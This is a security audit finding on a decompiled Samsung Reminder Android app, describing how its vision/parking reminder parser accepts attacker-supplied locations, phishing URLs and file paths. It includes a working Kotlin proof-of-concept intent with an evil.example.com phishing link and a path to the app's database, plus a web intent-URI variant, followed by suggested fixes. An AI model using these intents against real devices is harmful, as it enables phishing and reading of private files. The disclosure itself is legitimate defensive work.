## [V-019] `m9.e` AddVisionReminderParser â€” Fake Parking Reminder Injection (Attacker-Controlled Location + URL + AttachedFile Path)

**File:** `sources/m9/e.java` (82 lines)
**Severity:** High â€” reachable via V-017 chain; concrete abuse vectors are physical-phishing (fake parking coordinates) + clickable URL injection in reminder UI + unchecked AttachedFile path stored in reminder DB.
**Class of flaw:** CWE-20 (unchecked Bundle contents) + CWE-601 (open-redirect-like URL injection into stored reminder) + CWE-918 (SSRF flavour if the URL is auto-fetched anywhere) + CWE-22 (potential path traversal via `W6.m.r`).

### Summary of `c()` (parser body)
```java
public final void c() {
    Bundle vd = this.f42397b.getBundleExtra("visionData");           // attacker Bundle
    if (vd == null) { W6.m.m("... Vision Data is empty"); return; }
    String name    = vd.getString("CreateParkingReminderLocationName");
    String geoUrl  = vd.getString("CreateParkingReminderGeoPointUrl"); // URL â€” stored in reminder title
    String geoAddr = vd.getString("CreateParkingReminderGeoPointAddress");
    String title   = W6.m.f(ctx, name, geoAddr, geoUrl);              // formatted line including geoUrl
    d(title);                                                          // stores as reminder title Contents
    String utter   = Optional.ofNullable(vd.getString("CreateParkingReminderUtterance"))
                           .orElse(vd.getString("utterance", ""));
    Contents body = new Contents(this.f42398c, 3);
    body.setText(utter);
    this.f42386j = body;
    String fpath  = W6.m.r(ctx, vd);                                   // âš  file path derived from attacker bundle
    if (fpath != null) this.k = new AttachedFile(AbstractC3680n.j(fpath));
}
```

Then `e(Reminder)` appends the attacker's `AttachedFile` to the reminder's attached-file list and writes the Contents.

### Attacker capability (chained via V-017)
1. **Fake parking reminder (physical phishing).** `CreateParkingReminderLocationName` / `CreateParkingReminderGeoPointAddress` / `CreateParkingReminderGeoPointUrl` are attacker-supplied strings that `W6.m.f` joins into a user-visible line displayed as the reminder title ("Car parked at <address> â€” <url>"). User taps the URL thinking it leads to their parking-lot pin; instead it opens an attacker site.
2. **Open-redirect / URL stored in Reminder body.** Even if the title's URL is not tappable, the stored reminder survives sync â€” enterprise-managed devices syncing reminders to outlook-style calendars may surface the URL in a different context where it *is* clickable, or a voice-assistant readback may leak the URL to another channel.
3. **AttachedFile path injection.** `W6.m.r(ctx, vd)` produces a filesystem path derived from the attacker's bundle (likely from a `visionImagePath` / parking-pin-snapshot key). That path is wrapped in `new AttachedFile(AbstractC3680n.j(fpath))` and stored on the reminder. Downstream code that opens attached files (for preview, for OCR, or for sync upload) will read whatever path the attacker has smuggled â€” same privilege-escalated file-read primitive as V-012, routed through the reminder DB.
4. **Parking-reminder DoS / spam.** Unlike normal ReminderAddView, this parser does not prompt the user â€” it silently builds a reminder. Attacker can batch-create arbitrary parking reminders on the victim's device.

### Reachability
Reached through V-017: any V-015/V-016 chain that lands at `D.l` â†’ `m9.l.a` with `intent.action == "com.samsung.android.app.reminder.action.addVisionReminder"` selects this parser. The `visionData` extra must be a Parcelable `Bundle`, which cannot be fully expressed in an `intent://â€¦` URL â€” **but**:

* The V-016 Branch A path (`.putExtras(intent2)`) preserves arbitrary Bundle extras when the initial carrier comes from a real Android app (e.g., a 3rd-party app the victim has installed). A web deeplink alone cannot attach a typed Bundle, so the realistic exploit profile is:
  * **Installed attacker app** (zero permissions) â€” full capability via real Parcelable Bundle extras.
  * **Web-only** â€” attacker can still set scalar keys through `intent:` URIs with `.bun_key=value` but a full Bundle isn't constructable; this path is therefore *weaker* from pure web alone. The `CreateParkingReminderUtterance` / `utterance` fallback (line 44) IS a string extra â€” `utterance` fallback is **reachable from the main intent** (not inside `visionData` bundle), so even pure web deeplinks can inject body content.

### Proof-of-Concept â€” installed attacker app with zero permissions
```kotlin
val visionData = Bundle().apply {
    putString("CreateParkingReminderLocationName", "Your Car")
    putString("CreateParkingReminderGeoPointAddress", "1 Attacker Way, Seoul")
    putString("CreateParkingReminderGeoPointUrl", "http://evil.example.com/parking-phish")
    putString("CreateParkingReminderUtterance", "Tap to retrieve parking info")
    // If an additional key drives W6.m.r path derivation (e.g., "parkingSnapshotPath"):
    // putString("parkingSnapshotPath", "/data/data/com.samsung.android.app.reminder/databases/reminder.db")
}
val reach = Intent("com.samsung.android.app.reminder.action.addVisionReminder").apply {
    setClassName(
        "com.samsung.android.app.reminder",
        "com.samsung.android.app.reminder.ui.detail.view.DetailActivity"
    )
    // Force the share/ReminderAddView branch in D.l so m9.l.a is called:
    putExtra("add_reminder_from_share", true)
    putExtra("uuid", "b0000000-0000-0000-0000-000000000001")
    putExtra("android.intent.extra.TEXT", "parking")         // some parsers require this
    putExtra("visionData", visionData)                        // âš  the attacker bundle
    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
}
startActivity(reach)
```
The reminder app creates a reminder with an attacker-chosen parking location and URL. Victim later opens their reminders list â†’ sees "Your Car â€” 1 Attacker Way, Seoul â€” http://evil..." â†’ taps the URL.

### Web-only PoC (title-only phishing via `utterance` fallback)
```html
<!-- Only scalar extras â€” no typed Bundle â€” but utterance text and uuid still reach the reminder -->
<a href='intent://vision#Intent;scheme=reminder;
action=com.samsung.android.app.reminder.action.addVisionReminder;
S.uuid=b0000000-0000-0000-0000-000000000002;
S.android.intent.extra.TEXT=Tap%20to%20recover%20your%20car;
S.utterance=Emergency%3A%20tap%20http%3A%2F%2Fevil%2Fphish;
B.add_reminder_from_share=true;
S.popover_intent=intent%3A%23Intent%3Baction%3Dcom.samsung.android.app.reminder.action.addVisionReminder%3Bcomponent%3Dcom.samsung.android.app.reminder%2Fcom.samsung.android.app.reminder.ui.detail.add.AddActivity%3Bend;
end'>click</a>
```
(Route through MainListActivity's BROWSABLE scheme. Vision branch executes without the `visionData` bundle â€” returns early at line 33 â€” so this purely-web variant is blocked at `c.c()`. The body-text-injection capability only works through the generic share flow, not the vision branch itself.)

### Root-cause fixes
1. Refuse `addVisionReminder` Intents unless the caller is the Samsung Vision / Parking subsystem (signature check).
2. Strip or sanitise any URL/URI found in `CreateParkingReminderGeoPointUrl` â€” only allow `https://maps.google.com/...` or `geo:` URIs with hard-coded patterns.
3. In `W6.m.r`, reject filesystem paths outside a strict allow-list â€” never store arbitrary paths in `AttachedFile`.
4. Gate the whole share-intent factory (`m9.l.a`) on caller-package verification â€” covered in V-017.

